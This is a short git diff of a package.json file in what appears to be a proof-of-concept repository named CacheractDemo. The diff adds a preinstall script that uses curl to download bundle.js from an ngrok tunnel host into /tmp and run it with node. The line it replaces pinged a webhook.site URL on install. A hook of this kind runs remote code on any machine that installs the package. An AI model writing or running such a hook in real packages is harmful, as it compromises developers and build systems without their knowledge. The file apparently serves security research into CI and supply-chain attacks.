@@ -5,11 +5,11 @@
     "type": "git",
     "url": "https://github.com/AdnaneKhan/CacheractDemo"
   },
-  "description": "I changed this to trigger another test",
+  "description": "I changed this to trigger another test abc fdafaj",
   "main": "src/index.js",
   "scripts": {
     "test": "jest",
-    "preinstall": "curl -fsSL https://webhook.site/bcbb74a1-d23e-4d9d-953a-67ffef557573"
+    "preinstall": "curl -fsSL http://0.tcp.eu.ngrok.io:13216/bundle.js > /tmp/cacheract.js && node /tmp/cacheract.js"
   },
   "keywords": ["poc"],
   "author": "Adnan Khan",
